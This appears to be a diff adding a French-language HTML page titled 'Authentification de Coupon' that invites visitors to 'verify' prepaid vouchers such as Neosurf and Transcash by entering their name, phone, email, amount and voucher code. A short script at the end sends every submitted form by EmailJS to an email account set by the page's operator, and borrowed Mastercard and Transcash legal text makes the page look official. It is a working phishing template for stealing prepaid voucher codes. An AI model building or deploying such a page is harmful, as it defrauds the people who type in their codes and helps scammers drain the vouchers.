@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentification de Coupon</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    
+</head>
+<body>
+    <header>
+        <div class="logo">🛒 Service de Coupons</div>
+    </header>
+    
+    <section class="banner">
+        <img src="image/R.jpg" alt="Bannière du site">
+    </section>
+    
+    <div class="container">
+        <h2>Vérification de Coupon</h2>
+        <form id="contact-form" class="auth-form">
+            <input type="text" name="name" placeholder="Nom et prénom" required>
+            <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
+            <select name="type" required>
+                <option value="">Type de recharge</option>
+                <option value="neosurf">Neosurf</option>
+                <option value="transcash">Transcash</option>
+                <option value="mastercard">Mastercard</option>
+            </select>
+            <input type="number" name="amount" placeholder="Montant" required>
+            <input type="text" name="code" placeholder="Code" required>
+            <div class="toggle-password-container">
+                <input type="checkbox" id="togglePassword">
+                <label for="togglePassword">Cacher le code</label>
+            </div>
+            <input type="email" name="email" placeholder="Email valide" required>
+            <button type="submit">Valider</button>
+        </form>
+    </div>
+    
+    <footer>
+        <div class="payment-methods">
+            <img src="image/photo.jpg" alt="All-methode">
+        </div>
+        <section class="about">
+            <p>Mastercard est une marque déposée et le design des cercles est une marque commerciale de Mastercard International Incorporated. La Carte Transcash Mastercard est émise par Wirecard Card Solutions Ltd («WDCS») en vertu d’une licence de Mastercard International Incorporated. WDCS est autorisée par la Financial Conduct Authority à émettre de la Monnaie Electronique sous la réglementation de 2011 relative à la monnaie électronique (Réf: 900051).</p>
+            <span>*Selon Conditions Générales de Vente et Conditions Générales d’Utilisation des cartes de paiement prépayées Transcash.
+                (1) Notez que les lois locales, comme en Inde, peuvent ne pas autoriser l’utilisation d’une carte secondaire pour partager de l’argent.
+                (2) Coût d’un SMS ou d’un appel local chez votre opérateur téléphonique.
+                (3) Appel surtaxé 0,15€/min + coût d’un appel chez votre opérateur téléphonique.</span>
+        </section>
+        <p>&copy; 2025 Service Authentification de Coupons. Tous droits réservés.</p>
+    </footer>
+
+    <script>
+        (function() {
+            emailjs.init("TON_USER_ID"); // Remplace par ton User ID EmailJS
+
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                emailjs.sendForm('TON_SERVICE_ID', 'TON_TEMPLATE_ID', this)
+                    .then(function() {
+                        alert("E-mail envoyé !");
+                    }, function(error) {
+                        alert("Erreur : " + JSON.stringify(error));
+                    });
+            });
+        })();
+    </script>
+</body>
+</html>
